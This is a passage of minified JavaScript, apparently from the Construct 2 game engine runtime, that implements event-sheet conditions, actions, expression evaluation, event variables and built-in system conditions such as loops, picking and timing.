S,T=u&&!this.block.isFirstConditionOfType(this),C=!1,O=0,k=(S=T?l.else_instances:l.instances).length;O<k;++O){if(r=S[O],_)for(t=0,i=v.length;t<i;++t)(s=v[t]).variesPerInstance&&(b[t]=s.get(O));if(n=y?(p=0,g&&(p=r.type.family_beh_map[f]),x.apply(r.behavior_insts[m+p],b)):x.apply(r,b),cr.xor(n,w))if(C=!0,T){if(l.instances.push(r),d)for(t=0,i=r.siblings.length;t<i;t++)(o=r.siblings[t]).type.getCurrentSol().instances.push(o)}else{if(S[e]=r,d)for(t=0,i=r.siblings.length;t<i;t++)(o=r.siblings[t]).type.getCurrentSol().instances[e]=o;e++}else if(T){if(S[e]=r,d)for(t=0,i=r.siblings.length;t<i;t++)(o=r.siblings[t]).type.getCurrentSol().else_instances[e]=o;e++}else if(u&&(l.else_instances.push(r),d))for(t=0,i=r.siblings.length;t<i;t++)(o=r.siblings[t]).type.getCurrentSol().else_instances.push(o)}if(cr.truncateArray(S,e),d)for(O=0,k=(h=c.container).length;O<k;O++)a=h[O].getCurrentSol(),T?cr.truncateArray(a.else_instances,e):cr.truncateArray(a.instances,e);var A=C;if(T&&!C)for(O=0,k=l.instances.length;O<k;O++){if(r=l.instances[O],_)for(t=0,i=v.length;t<i;t++)(s=v[t]).variesPerInstance&&(b[t]=s.get(O));if(n=y?x.apply(r.behavior_insts[m],b):x.apply(r,b),cr.xor(n,w)){C=!0;break}}return c.finish&&c.finish(A||u),u?C:l.hasObjects()},cr.condition=r,h.prototype.postInit=function(){for(var t,e=0,i=this.parameters.length;e<i;e++)(t=this.parameters[e]).postInit(),t.variesPerInstance&&(this.anyParamVariesPerInstance=!0)},h.prototype.run_system=function(){for(var t=this.runtime,e=this.parameters,i=this.results,s=0,n=e.length;s<n;++s)i[s]=e[s].get();return this.func.apply(t.system,i)},h.prototype.run_object=function(){var t,e,i,s,n,r,o,a=this.type,h=this.beh_index,c=a.family_index,l=this.anyParamVariesPerInstance,u=this.parameters,p=this.results,d=this.func,g=a.getCurrentSol().getObjects(),f=a.is_family,m=-1<h;if(l)for(e=0,s=u.length;e<s;++e)(n=u[e]).variesPerInstance||(p[e]=n.get(0));else for(e=0,s=u.length;e<s;++e)p[e]=u[e].get(0);for(t=0,i=g.length;t<i;++t){if(r=g[t],l)for(e=0,s=u.length;e<s;++e)(n=u[e]).variesPerInstance&&(p[e]=n.get(t));m?(o=0,f&&(o=r.type.family_beh_map[c]),d.apply(r.behavior_insts[h+o],p)):d.apply(r,p)}return!1},cr.action=h;var c=[],l=-1;function u(){return l++,c.length===l&&c.push(new cr.expvalue),c[l]}function p(){l--}function d(t,e){var i,s,n;switch(this.owner=t,this.block=t.block,this.sheet=t.sheet,this.runtime=t.runtime,this.type=e[0],this.expression=null,this.solindex=0,this.get=null,this.combosel=0,this.layout=null,this.key=0,this.object=null,this.index=0,this.varname=null,this.eventvar=null,this.fileinfo=null,this.subparams=null,this.variadicret=null,this.subparams=null,this.variadicret=null,this.variesPerInstance=!1,e[0]){case 0:case 7:this.expression=new cr.expNode(this,e[1]),this.solindex=0,this.get=this.get_exp;break;case 1:this.expression=new cr.expNode(this,e[1]),this.solindex=0,this.get=this.get_exp_str;break;case 5:this.expression=new cr.expNode(this,e[1]),this.solindex=0,this.get=this.get_layer;break;case 3:case 8:this.combosel=e[1],this.get=this.get_combosel;break;case 6:this.layout=this.runtime.layouts[e[1]],this.get=this.get_layout;break;case 9:this.key=e[1],this.get=this.get_key;break;case 4:this.object=this.runtime.types_by_index[e[1]],this.get=this.get_object,this.block.addSolModifier(this.object),this.owner instanceof cr.action?this.block.setSolWriterAfterCnds():this.block.parent&&this.block.parent.setSolWriterAfterCnds();break;case 10:this.index=e[1],t.type&&t.type.is_family?(this.get=this.get_familyvar,this.variesPerInstance=!0):this.get=this.get_instvar;break;case 11:this.varname=e[1],this.eventvar=null,this.get=this.get_eventvar;break;case 2:case 12:this.fileinfo=e[1],this.get=this.get_audiofile;break;case 13:for(this.get=this.get_variadic,this.subparams=[],this.variadicret=[],i=1,s=e.length;i<s;i++)n=new cr.parameter(this.owner,e[i]),cr.seal(n),this.subparams.push(n),this.variadicret.push(0)}}function g(t,e,i){this.sheet=t,this.parent=e,this.runtime=t.runtime,this.solModifiers=[],this.name=i[1],this.vartype=i[2],this.initial=i[3],this.is_static=!!i[4],this.is_constant=!!i[5],this.sid=i[6],(this.runtime.varsBySid[this.sid.toString()]=this).data=this.initial,this.parent?(this.is_static||this.is_constant?this.localIndex=-1:this.localIndex=this.runtime.stackLocalCount++,this.runtime.all_local_vars.push(this)):(this.localIndex=-1,this.runtime.all_global_vars.push(this))}function f(t,e,i){this.sheet=t,this.parent=e,this.runtime=t.runtime,this.solModifiers=[],this.include_sheet=null,this.include_sheet_name=i[1],this.active=!0}function m(){this.temp_parents_arr=[],this.reset(null),cr.seal(this)}d.prototype.postInit=function(){var t,e;if(11===this.type)this.eventvar=this.runtime.getEventVariableByName(this.varname,this.block.parent);else if(13===this.type)for(t=0,e=this.subparams.length;t<e;t++)this.subparams[t].postInit();this.expression&&this.expression.postInit()},d.prototype.maybeVaryForType=function(t){this.variesPerInstance||t&&(t.plugin.singleglobal||(this.variesPerInstance=!0))},d.prototype.setVaries=function(){this.variesPerInstance=!0},d.prototype.get_exp=function(t){this.solindex=t||0;t=u();return this.expression.get(t),p(),t.data},d.prototype.get_exp_str=function(t){this.solindex=t||0;t=u();return this.expression.get(t),p(),cr.is_string(t.data)?t.data:""},d.prototype.get_object=function(){return this.object},d.prototype.get_combosel=function(){return this.combosel},d.prototype.get_layer=function(t){this.solindex=t||0;t=u();return this.expression.get(t),p(),t.is_number()?this.runtime.getLayerByNumber(t.data):this.runtime.getLayerByName(t.data)},d.prototype.get_layout=function(){return this.layout},d.prototype.get_key=function(){return this.key},d.prototype.get_instvar=function(){return this.index},d.prototype.get_familyvar=function(t){var e=t||0,i=this.owner.type,s=null,n=i.getCurrentSol(),t=n.getObjects();if(t.length)s=t[e%t.length].type;else if(n.else_instances.length)s=n.else_instances[e%n.else_instances.length].type;else{if(!i.instances.length)return 0;s=i.instances[e%i.instances.length].type}return this.index+s.family_var_map[i.family_index]},d.prototype.get_eventvar=function(){return this.eventvar},d.prototype.get_audiofile=function(){return this.fileinfo},d.prototype.get_variadic=function(){for(var t=0,e=this.subparams.length;t<e;t++)this.variadicret[t]=this.subparams[t].get();return this.variadicret},cr.parameter=d,g.prototype.postInit=function(){this.solModifiers=n(this.solModifiers)},g.prototype.setValue=function(t){var e=this.runtime.getCurrentLocalVarStack();this.parent&&!this.is_static&&e?(this.localIndex>=e.length&&(e.length=this.localIndex+1),e[this.localIndex]=t):this.data=t},g.prototype.getValue=function(){var t=this.runtime.getCurrentLocalVarStack();return!this.parent||this.is_static||!t||this.is_constant?this.data:this.localIndex>=t.length||void 0===t[this.localIndex]?this.initial:t[this.localIndex]},g.prototype.run=function(){!this.parent||this.is_static||this.is_constant||this.setValue(this.initial)},cr.eventvariable=g,f.prototype.toString=function(){return"include:"+this.include_sheet.toString()},f.prototype.postInit=function(){this.include_sheet=this.runtime.eventsheets[this.include_sheet_name],this.sheet.includes.add(this),this.solModifiers=n(this.solModifiers);for(var t=this.parent;t;)t.group&&t.contained_includes.push(this),t=t.parent;this.updateActive()},f.prototype.run=function(){this.parent&&this.runtime.pushCleanSol(this.runtime.types_by_index),this.include_sheet.hasRun||this.include_sheet.run(!0),this.parent&&this.runtime.popSol(this.runtime.types_by_index)},f.prototype.updateActive=function(){for(var t=this.parent;t;){if(t.group&&!t.group_active)return void(this.active=!1);t=t.parent}this.active=!0},f.prototype.isActive=function(){return this.active},cr.eventinclude=f,m.prototype.reset=function(t){this.current_event=t,this.cndindex=0,this.actindex=0,cr.clearArray(this.temp_parents_arr),this.last_event_true=!1,this.else_branch_ran=!1,this.any_true_state=!1},m.prototype.isModifierAfterCnds=function(){return!!this.current_event.solWriterAfterCnds||this.cndindex<this.current_event.conditions.length-1&&!!this.current_event.solModifiers.length},cr.eventStackFrame=m}(),function(){function t(t,e){this.owner=t,this.runtime=t.runtime,this.type=e[0],this.get=[this.eval_int,this.eval_float,this.eval_string,this.eval_unaryminus,this.eval_add,this.eval_subtract,this.eval_multiply,this.eval_divide,this.eval_mod,this.eval_power,this.eval_and,this.eval_or,this.eval_equal,this.eval_notequal,this.eval_less,this.eval_lessequal,this.eval_greater,this.eval_greaterequal,this.eval_conditional,this.eval_system_exp,this.eval_object_exp,this.eval_instvar_exp,this.eval_behavior_exp,this.eval_eventvar_exp][this.type];var i=null;switch(this.value=null,this.first=null,this.second=null,this.third=null,this.func=null,this.results=null,this.parameters=null,this.object_type=null,this.beh_index=-1,this.instance_expr=null,this.varindex=-1,this.behavior_type=null,this.varname=null,this.eventvar=null,this.return_string=!1,this.type){case 0:case 1:case 2:this.value=e[1];break;case 3:this.first=new cr.expNode(t,e[1]);break;case 18:this.first=new cr.expNode(t,e[1]),this.second=new cr.expNode(t,e[2]),this.third=new cr.expNode(t,e[3]);break;case 19:this.func=this.runtime.GetObjectReference(e[1]),this.func!==cr.system_object.prototype.exps.random&&this.func!==cr.system_object.prototype.exps.choose||this.owner.setVaries(),this.results=[],this.parameters=[],3===e.length?(i=e[2],this.results.length=i.length+1):this.results.length=1;break;case 20:this.object_type=this.runtime.types_by_index[e[1]],this.beh_index=-1,this.func=this.runtime.GetObjectReference(e[2]),this.return_string=e[3],cr.plugins_.Function&&this.func===cr.plugins_.Function.prototype.exps.Call&&this.owner.setVaries(),e[4]?this.instance_expr=new cr.expNode(t,e[4]):this.instance_expr=null,this.results=[],this.parameters=[],6===e.length?(i=e[5],this.results.length=i.length+1):this.results.length=1;break;case 21:this.object_type=this.runtime.types_by_index[e[1]],this.return_string=e[2],e[3]?this.instance_expr=new cr.expNode(t,e[3]):this.instance_expr=null,this.varindex=e[4];break;case 22:this.object_type=this.runtime.types_by_index[e[1]],this.behavior_type=this.object_type.getBehaviorByName(e[2]),this.beh_index=this.object_type.getBehaviorIndexByName(e[2]),this.func=this.runtime.GetObjectReference(e[3]),this.return_string=e[4],e[5]?this.instance_expr=new cr.expNode(t,e[5]):this.instance_expr=null,this.results=[],this.parameters=[],7===e.length?(i=e[6],this.results.length=i.length+1):this.results.length=1;break;case 23:this.varname=e[1],this.eventvar=null}if(this.owner.maybeVaryForType(this.object_type),4<=this.type&&this.type<=17&&(this.first=new cr.expNode(t,e[1]),this.second=new cr.expNode(t,e[2])),i)for(var s=0,n=i.length;s<n;s++)this.parameters.push(new cr.expNode(t,i[s]));cr.seal(this)}t.prototype.postInit=function(){if(23===this.type&&(this.eventvar=this.owner.runtime.getEventVariableByName(this.varname,this.owner.block.parent)),this.first&&this.first.postInit(),this.second&&this.second.postInit(),this.third&&this.third.postInit(),this.instance_expr&&this.instance_expr.postInit(),this.parameters)for(var t=0,e=this.parameters.length;t<e;t++)this.parameters[t].postInit()};var e=[],i=-1;function l(){return++i,e.length===i&&e.push(new cr.expvalue),e[i]}function u(){--i}function p(t,e,i){for(var s=0,n=t.length;s<n;++s)t[s].get(i),e[s+1]=i.data}function s(t,e){this.type=t||cr.exptype.Integer,this.data=e||0,this.object_class=null,this.type==cr.exptype.Integer&&(this.data=Math.floor(this.data)),cr.seal(this)}t.prototype.eval_system_exp=function(t){var e=this.parameters,i=this.results;i[0]=t,p(e,i,l()),u(),this.func.apply(this.runtime.system,i)},t.prototype.eval_object_exp=function(t){var e=this.object_type,i=this.results,s=this.parameters,n=this.instance_expr,r=this.func,o=this.owner.solindex,a=e.getCurrentSol(),h=a.getObjects();if(!h.length){if(!a.else_instances.length)return void(this.return_string?t.set_string(""):t.set_int(0));h=a.else_instances}(i[0]=t).object_class=e;t=l();p(s,i,t),n&&(n.get(t),t.is_number()&&(o=t.data,h=e.instances)),u();e=h.length;(e<=o||o<=-e)&&(o%=e),o<0&&(o+=e);r.apply(h[o],i)},t.prototype.eval_behavior_exp=function(t){var e=this.object_type,i=this.results,s=this.parameters,n=this.instance_expr,r=this.beh_index,o=this.func,a=this.owner.solindex,h=e.getCurrentSol(),c=h.getObjects();if(!c.length){if(!h.else_instances.length)return void(this.return_string?t.set_string(""):t.set_int(0));c=h.else_instances}(i[0]=t).object_class=e;t=l();p(s,i,t),n&&(n.get(t),t.is_number()&&(a=t.data,c=e.instances)),u();t=c.length;(t<=a||a<=-t)&&(a%=t),a<0&&(a+=t);c=c[a],a=0;e.is_family&&(a=c.type.family_beh_map[e.family_index]);o.apply(c.behavior_insts[r+a],i)},t.prototype.eval_instvar_exp=function(t){var e,i=this.instance_expr,s=this.object_type,n=this.varindex,r=this.owner.solindex,o=s.getCurrentSol(),a=o.getObjects();if(!a.length){if(!o.else_instances.length)return void(this.return_string?t.set_string(""):t.set_int(0));a=o.else_instances}if(i){o=l();if(i.get(o),o.is_number()){r=o.data;var h=s.instances;0!==h.length&&(r%=h.length)<0&&(r+=h.length);var c=(e=s.getInstanceByIID(r)).instance_vars[n];return cr.is_string(c)?t.set_string(c):t.set_float(c),void u()}u()}h=a.length;(h<=r||r<=-h)&&(r%=h),r<0&&(r+=h),e=a[r];r=0;s.is_family&&(r=e.type.family_var_map[s.family_index]);c=e.instance_vars[n+r];cr.is_string(c)?t.set_string(c):t.set_float(c)},t.prototype.eval_int=function(t){t.type=cr.exptype.Integer,t.data=this.value},t.prototype.eval_float=function(t){t.type=cr.exptype.Float,t.data=this.value},t.prototype.eval_string=function(t){t.type=cr.exptype.String,t.data=this.value},t.prototype.eval_unaryminus=function(t){this.first.get(t),t.is_number()&&(t.data=-t.data)},t.prototype.eval_add=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data+=e.data,e.is_float()&&t.make_float()),u()},t.prototype.eval_subtract=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data-=e.data,e.is_float()&&t.make_float()),u()},t.prototype.eval_multiply=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data*=e.data,e.is_float()&&t.make_float()),u()},t.prototype.eval_divide=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data/=e.data,t.make_float()),u()},t.prototype.eval_mod=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data%=e.data,e.is_float()&&t.make_float()),u()},t.prototype.eval_power=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data=Math.pow(t.data,e.data),e.is_float()&&t.make_float()),u()},t.prototype.eval_and=function(t){this.first.get(t);var e=l();this.second.get(e),e.is_string()||t.is_string()?this.eval_and_stringconcat(t,e):this.eval_and_logical(t,e),u()},t.prototype.eval_and_stringconcat=function(t,e){t.is_string()&&e.is_string()?this.eval_and_stringconcat_str_str(t,e):this.eval_and_stringconcat_num(t,e)},t.prototype.eval_and_stringconcat_str_str=function(t,e){t.data+=e.data},t.prototype.eval_and_stringconcat_num=function(t,e){t.is_string()?t.data+=(Math.round(1e10*e.data)/1e10).toString():t.set_string(t.data.toString()+e.data)},t.prototype.eval_and_logical=function(t,e){t.set_int(t.data&&e.data?1:0)},t.prototype.eval_or=function(t){this.first.get(t);var e=l();this.second.get(e),t.is_number()&&e.is_number()&&(t.data||e.data?t.set_int(1):t.set_int(0)),u()},t.prototype.eval_conditional=function(t){this.first.get(t),(t.data?this.second:this.third).get(t)},t.prototype.eval_equal=function(t){this.first.get(t);var e=l();this.second.get(e),t.set_int(t.data===e.data?1:0),u()},t.prototype.eval_notequal=function(t){this.first.get(t);var e=l();this.second.get(e),t.set_int(t.data!==e.data?1:0),u()},t.prototype.eval_less=function(t){this.first.get(t);var e=l();this.second.get(e),t.set_int(t.data<e.data?1:0),u()},t.prototype.eval_lessequal=function(t){this.first.get(t);var e=l();this.second.get(e),t.set_int(t.data<=e.data?1:0),u()},t.prototype.eval_greater=function(t){this.first.get(t);var e=l();this.second.get(e),t.set_int(t.data>e.data?1:0),u()},t.prototype.eval_greaterequal=function(t){this.first.get(t);var e=l();this.second.get(e),t.set_int(t.data>=e.data?1:0),u()},t.prototype.eval_eventvar_exp=function(t){var e=this.eventvar.getValue();cr.is_number(e)?t.set_float(e):t.set_string(e)},cr.expNode=t,s.prototype.is_int=function(){return this.type===cr.exptype.Integer},s.prototype.is_float=function(){return this.type===cr.exptype.Float},s.prototype.is_number=function(){return this.type===cr.exptype.Integer||this.type===cr.exptype.Float},s.prototype.is_string=function(){return this.type===cr.exptype.String},s.prototype.make_int=function(){this.is_int()||(this.is_float()?this.data=Math.floor(this.data):this.is_string()&&(this.data=parseInt(this.data,10)),this.type=cr.exptype.Integer)},s.prototype.make_float=function(){this.is_float()||(this.is_string()&&(this.data=parseFloat(this.data)),this.type=cr.exptype.Float)},s.prototype.make_string=function(){this.is_string()||(this.data=this.data.toString(),this.type=cr.exptype.String)},s.prototype.set_int=function(t){this.type=cr.exptype.Integer,this.data=Math.floor(t)},s.prototype.set_float=function(t){this.type=cr.exptype.Float,this.data=t},s.prototype.set_string=function(t){this.type=cr.exptype.String,this.data=t},s.prototype.set_any=function(t){cr.is_number(t)?(this.type=cr.exptype.Float,this.data=t):cr.is_string(t)?(this.type=cr.exptype.String,this.data=t.toString()):(this.type=cr.exptype.Integer,this.data=0)},cr.expvalue=s,cr.exptype={Integer:0,Float:1,String:2}}(),cr.system_object=function(t){this.runtime=t,this.waits=[]},cr.system_object.prototype.saveToJSON=function(){for(var t,e,i,s,n,r,o,a={waits:[]},h=a.waits,c=0,l=this.waits.length;c<l;c++){for(o={t:(s=this.waits[c]).time,st:s.signaltag,s:s.signalled,ev:s.ev.sid,sm:[],sols:{}},s.ev.actions[s.actindex]&&(o.act=s.ev.actions[s.actindex].sid),t=0,e=s.solModifiers.length;t<e;t++)o.sm.push(s.solModifiers[t].sid);for(i in s.sols)if(s.sols.hasOwnProperty(i)){for(n=this.runtime.types_by_index[parseInt(i,10)],r={sa:s.sols[i].sa,insts:[]},t=0,e=s.sols[i].insts.length;t<e;t++)r.insts.push(s.sols[i].insts[t].uid);o.sols[n.sid.toString()]=r}h.push(o)}return a},cr.system_object.prototype.loadFromJSON=function(t){var e,i,s,n,r,o,a,h,c,l,u,p,d,g=t.waits;for(cr.clearArray(this.waits),e=0,i=g.length;e<i;e++)if(o=g[e],h=this.runtime.blocksBySid[o.ev.toString()]){for(c=-1,s=0,n=h.actions.length;s<n;s++)if(h.actions[s].sid===o.act){c=s;break}if(-1!==c){for((a={sols:{},solModifiers:[],deleteme:!1}).time=o.t,a.signaltag=o.st||"",a.signalled=!!o.s,a.ev=h,a.actindex=c,s=0,n=o.sm.length;s<n;s++)(l=this.runtime.getObjectTypeBySid(o.sm[s]))&&a.solModifiers.push(l);for(r in o.sols)if(o.sols.hasOwnProperty(r)&&(l=this.runtime.getObjectTypeBySid(parseInt(r,10)))){for(p={sa:(u=o.sols[r]).sa,insts:[]},s=0,n=u.insts.length;s<n;s++)(d=this.runtime.getObjectByUID(u.insts[s]))&&p.insts.push(d);a.sols[l.index.toString()]=p}this.waits.push(a)}}},function(){var t=cr.system_object.prototype;function e(){}e.prototype.EveryTick=function(){return!0},e.prototype.OnLayoutStart=function(){return!0},e.prototype.OnLayoutEnd=function(){return!0},e.prototype.Compare=function(t,e,i){return cr.do_cmp(t,e,i)},e.prototype.CompareTime=function(t,e){var i=this.runtime.kahanTime.sum;if(0!==t)return cr.do_cmp(i,t,e);t=this.runtime.getCurrentCondition();return!t.extra.CompareTime_executed&&e<=i&&(t.extra.CompareTime_executed=!0)},e.prototype.LayerVisible=function(t){return!!t&&t.visible},e.prototype.LayerEmpty=function(t){return!!t&&!t.instances.length},e.prototype.LayerCmpOpacity=function(t,e,i){return!!t&&cr.do_cmp(100*t.opacity,e,i)},e.prototype.Repeat=function(t){var e,i=this.runtime.getCurrentEventStack(),s=i.current_event,i=i.isModifierAfterCnds(),n=this.runtime.pushLoopStack();if(i)for(e=0;e<t&&!n.stopped;e++)this.runtime.pushCopySol(s.solModifiers),n.index=e,s.retrigger(),this.runtime.popSol(s.solModifiers);else for(e=0;e<t&&!n.stopped;e++)n.index=e,s.retrigger();return this.runtime.popLoopStack(),!1},e.prototype.While=function(t){var e,i=this.runtime.getCurrentEventStack(),s=i.current_event,i=i.isModifierAfterCnds(),n=this.runtime.pushLoopStack();if(i)for(e=0;!n.stopped;e++)this.runtime.pushCopySol(s.solModifiers),n.index=e,s.retrigger()||(n.stopped=!0),this.runtime.popSol(s.solModifiers);else for(e=0;!n.stopped;e++)n.index=e,s.retrigger()||(n.stopped=!0);return this.runtime.popLoopStack(),!1},e.prototype.For=function(t,e,i){var s,n=this.runtime.getCurrentEventStack(),r=n.current_event,n=n.isModifierAfterCnds(),o=this.runtime.pushLoopStack(t);if(i<e)if(n)for(s=e;i<=s&&!o.stopped;--s)this.runtime.pushCopySol(r.solModifiers),o.index=s,r.retrigger(),this.runtime.popSol(r.solModifiers);else for(s=e;i<=s&&!o.stopped;--s)o.index=s,r.retrigger();else if(n)for(s=e;s<=i&&!o.stopped;++s)this.runtime.pushCopySol(r.solModifiers),o.index=s,r.retrigger(),this.runtime.popSol(r.solModifiers);else for(s=e;s<=i&&!o.stopped;++s)o.index=s,r.retrigger();return this.runtime.popLoopStack(),!1};var y=[],_=-1;function v(t,e){t=t.extra.c2_feo_val,e=e.extra.c2_feo_val;return cr.is_number(t)&&cr.is_number(e)?t-e:(t=""+t)<(e=""+e)?-1:e<t?1:0}e.prototype.ForEach=function(t){var e=t.getCurrentSol();_++,y.length===_&&y.push([]);var i=y[_];cr.shallowAssignArray(i,e.getObjects());var s,n,r,o,a,h,c,l=this.runtime.getCurrentEventStack(),u=l.current_event,l=l.isModifierAfterCnds(),p=this.runtime.pushLoopStack(),d=t.is_contained;if(l)for(s=0,n=i.length;s<n&&!p.stopped;s++){if(this.runtime.pushCopySol(u.solModifiers),a=i[s],(e=t.getCurrentSol()).select_all=!1,cr.clearArray(e.instances),e.instances[0]=a,d)for(r=0,o=a.siblings.length;r<o;r++)(c=(h=a.siblings[r]).type.getCurrentSol()).select_all=!1,cr.clearArray(c.instances),c.instances[0]=h;p.index=s,u.retrigger(),this.runtime.popSol(u.solModifiers)}else for(e.select_all=!1,cr.clearArray(e.instances),s=0,n=i.length;s<n&&!p.stopped;s++){if(a=i[s],e.instances[0]=a,d)for(r=0,o=a.siblings.length;r<o;r++)(c=(h=a.siblings[r]).type.getCurrentSol()).select_all=!1,cr.clearArray(c.instances),c.instances[0]=h;p.index=s,u.retrigger()}return cr.clearArray(i),this.runtime.popLoopStack(),_--,!1},e.prototype.ForEachOrdered=function(t,e,i){var s=t.getCurrentSol();_++,y.length===_&&y.push([]);var n=y[_];cr.shallowAssignArray(n,s.getObjects());for(var r,o,a,h,c,l=this.runtime.getCurrentEventStack(),u=l.current_event,p=this.runtime.getCurrentCondition(),l=l.isModifierAfterCnds(),d=this.runtime.pushLoopStack(),g=0,f=n.length;g<f;g++)n[g].extra.c2_feo_val=p.parameters[1].get(g);n.sort(v),1===i&&n.reverse();var m=t.is_contained;if(l)for(g=0,f=n.length;g<f&&!d.stopped;g++){if(this.runtime.pushCopySol(u.solModifiers),a=n[g],(s=t.getCurrentSol()).select_all=!1,cr.clearArray(s.instances),s.instances[0]=a,m)for(r=0,o=a.siblings.length;r<o;r++)(c=(h=a.siblings[r]).type.getCurrentSol()).select_all=!1,cr.clearArray(c.instances),c.instances[0]=h;d.index=g,u.retrigger(),this.runtime.popSol(u.solModifiers)}else for(s.select_all=!1,cr.clearArray(s.instances),g=0,f=n.length;g<f&&!d.stopped;g++){if(a=n[g],s.instances[0]=a,m)for(r=0,o=a.siblings.length;r<o;r++)(c=(h=a.siblings[r]).type.getCurrentSol()).select_all=!1,cr.clearArray(c.instances),c.instances[0]=h;d.index=g,u.retrigger()}return cr.clearArray(n),this.runtime.popLoopStack(),_--,!1},e.prototype.PickByComparison=function(t,e,i,s){var n;if(t){_++,y.length===_&&y.push([]);var r=y[_],o=t.getCurrentSol();cr.shallowAssignArray(r,o.getObjects()),o.select_all&&cr.clearArray(o.else_instances);for(var a=this.runtime.getCurrentCondition(),h=0,c=0,l=r.length;h<l;h++)n=r[h],r[c]=n,e=a.parameters[1].get(h),s=a.parameters[3].get(h),cr.do_cmp(e,i,s)?c++:o.else_instances.push(n);return cr.truncateArray(r,c),o.select_all=!1,cr.shallowAssignArray(o.instances,r),cr.clearArray(r),_--,t.applySolToContainer(),!!o.instances.length}},e.prototype.PickByEvaluate=function(t,e){var i;if(t){_++,y.length===_&&y.push([]);var s=y[_],n=t.getCurrentSol();cr.shallowAssignArray(s,n.getObjects()),n.select_all&&cr.clearArray(n.else_instances);for(var r=this.runtime.getCurrentCondition(),o=0,a=0,h=s.length;o<h;o++)i=s[o],s[a]=i,r.parameters[1].get(o)?a++:n.else_instances.push(i);return cr.truncateArray(s,a),n.select_all=!1,cr.shallowAssignArray(n.instances,s),cr.clearArray(s),_--,t.applySolToContainer(),!!n.instances.length}},e.prototype.TriggerOnce=function(){var t=this.runtime.getCurrentCondition().extra;void 0===t.TriggerOnce_lastTick&&(t.TriggerOnce_lastTick=-1);var e=t.TriggerOnce_lastTick,i=this.runtime.tickcount;return t.TriggerOnce_lastTick=i,this.runtime.layout_first_tick||e!==i-1},e.prototype.Every=function(t){var e=this.runtime.getCurrentCondition(),i=e.extra.Every_lastTime||0,s=this.runtime.kahanTime.sum;void 0===e.extra.Every_seconds&&(e.extra.Every_seconds=t);var n=e.extra.Every_seconds;return i+n<=s?(e.extra.Every_lastTime=i+n,s>=e.extra.Every_lastTime+.04&&(e.extra.Every_lastTime=s),e.extra.Every_seconds=t,!0):(s<i-.1&&(e.extra.Every_lastTime=s),!1)},e.prototype.PickNth=function(t,e){if(!t)return!1;var i=t.getCurrentSol(),s=i.getObjects();if((e=cr.floor(e))<0||e>=s.length)return!1;e=s[e];return i.pick_one(e),t.applySolToContainer(),!0},e.prototype.PickRandom=function(t){if(!t)return!1;var e=t.getCurrentSol(),i=e.getObjects(),s=cr.floor(Math.random()*i.length);if(s>=i.length)return!1;s=i[s];return e.pick_one(s),t.applySolToContainer(),!0},e.prototype.CompareVar=function(t,e,i){return cr.do_cmp(t.getValue(),e,i)},e.prototype.IsGroupActive=function(t){t=this.runtime.groups_by_name[t.toLowerCase()];return t&&t.group_active},e.prototype.IsPreview=function(){return"undefined"!=typeof cr_is_preview},e.prototype.PickAll=function(t){return!!t&&(!!t.instances.length&&(t.getCurrentSol().select_all=!0,t.applySolToContainer(),!0))},e.prototype.IsMobile=function(){return this.runtime.isMobile},e.prototype.CompareBetween=function(t,e,i){return e<=t&&t<=i},e.prototype.Else=function(){var t=this.runtime.getCurrentEventStack();return!t.else_branch_ran&&!t.last_event_true},e.prototype.OnLoadFinished=function(){return!0},e.prototype.OnCanvasSnapshot=function(){return!0},e.prototype.EffectsSupported=function(){return!!this.runtime.glwrap},e.prototype.OnSaveComplete=function(){return!0},e.prototype.OnSaveFailed=function(){return!0},e.prototype.OnLoadComplete=function(){return!0},e.prototype.OnLoadFailed=function(){return!0},e.prototype.ObjectUIDExists=function(t){return!!this.runtime.getObjectByUID(t)},e.prototype.IsOnPlatform=function(t){var e=this.runtime;switch(t){case 0:return!(e.isDomFree||e.isNodeWebkit||e.isCordova||e.isWinJS||e.isWindowsPhone8||e.isBlackberry10||e.isAmazonWebApp);case 1:return e.isiOS;case 2:return e.isAndroid;case 3:return e.isWindows8App;case 4:return e.isWindowsPhone8;case 5:return e.isBlackberry10;case 6:return e.isTizen;case 7:return e.isCocoonJs;case 8:return e.isCordova;case 9:return e.isArcade;case 10:return e.isNodeWebkit;case 11:return e.isCrosswalk;case 12:return e.isAmazonWebApp;case 13:return e.isWindows10;default:return!1}};var i=null,s="",n="";function r(t,e){return i&&t===s&&e===n||(i=new RegExp(t,e),s=t,n=e),i.lastIndex=0,i}e.prototype.RegexTest=function(t,e,i){return r(e,i).test(t)};var l=[];function o(){}e.prototype.PickOverlappingPoint=function(t,e,i){if(!t)return!1;var s,n,r,o=t.getCurrentSol(),a=o.getObjects(),h=this.runtime.getCurrentEventStack().current_event.orblock,c=this.runtime.getCurrentCondition();for(o.select_all?(cr.shallowAssignArray(l,a),cr.clearArray(o.else_instances),o.select_all=!1,cr.clearArray(o.instances)):h?(cr.shallowAssignArray(l,o.else_instances),cr.clearArray(o.else_instances)):(cr.shallowAssignArray(l,a),cr.clearArray(o.instances)),s=0,n=l.length;s<n;++s)(r=l[s]).update_bbox(),(cr.xor(r.contains_pt(e,i),c.inverted)?o.instances:o.else_instances).push(r);return t.applySolToContainer(),cr.xor(!!o.instances.length,c.inverted)},e.prototype.IsNaN=function(t){return!!isNaN(t)},e.prototype.AngleWithin=function(t,e,i){return cr.angleDiff(cr.to_radians(t),cr.to_radians(i))<=cr.to_radians(e)},e.prototype.IsClockwiseFrom=function(t,e){return cr.angleClockwise(cr.to_radians(t),cr.to_radians(e))},e.prototype.IsBetweenAngles=function(t,e,i){t=cr.to_clamped_radians(t),e=cr.to_clamped_radians(e),i=cr.to_clamped_radians(i);return!cr.angleClockwise(i,e)?!(!cr.angleClockwise(t,e)&&cr.angleClockwise(t,i)):cr.angleClockwise(t,e)&&!cr.angleClockwise(t,i)},e.prototype.IsValueType=function(t,e){return"number"==typeof t?0===e:1===e},t.cnds=new e,o.prototype.GoToLayout=function(t){this.runtime.isloading||this.runtime.changelayout||(this.runtime.changelayout=t)},o.prototype.NextPrevLayout=function(t){var 